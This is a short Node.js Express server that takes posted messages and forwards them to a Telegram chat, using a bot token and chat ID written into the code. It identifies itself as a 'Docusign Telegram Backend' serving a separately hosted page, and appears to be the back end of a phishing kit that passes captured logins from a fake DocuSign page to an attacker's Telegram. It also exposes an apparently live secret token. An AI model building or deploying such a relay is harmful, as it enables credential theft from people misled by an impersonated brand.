const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// ================================================
// TELEGRAM CONFIG - HIDDEN ON SERVER
// ================================================
const TELEGRAM_BOT_TOKEN = "8737888368:AAF58dFmjkS22Ee__psUZ-02LsCvOw95fS0";
const TELEGRAM_CHAT_ID = "7075480337";

// ================================================
// CORS - Allow all origins (for Cloudflare Pages)
// ================================================
app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    // Handle preflight OPTIONS request
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.use(express.json());

// ================================================
// SECURE ENDPOINT: Send Telegram message
// ================================================
app.post('/api/telegram', async (req, res) => {
    const { message } = req.body;
    
    console.log('📩 Received request:', { message: message ? message.substring(0, 50) : 'empty' });
    
    if (!message) {
        return res.status(400).json({ error: 'Message is required' });
    }

    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        console.log('📤 Sending to Telegram...');
        
        const response = await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        
        console.log('✅ Telegram sent successfully');
        res.json({ success: true, data: response.data });
    } catch (error) {
        console.error('❌ Telegram error:', error.response?.data || error.message);
        res.status(500).json({ 
            error: 'Failed to send message', 
            details: error.response?.data || error.message 
        });
    }
});

app.get('/', (req, res) => {
    res.json({ status: 'ok', message: 'Docusign Telegram Backend Running' });
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`✅ CORS enabled`);
    console.log(`✅ Telegram config loaded`);
});
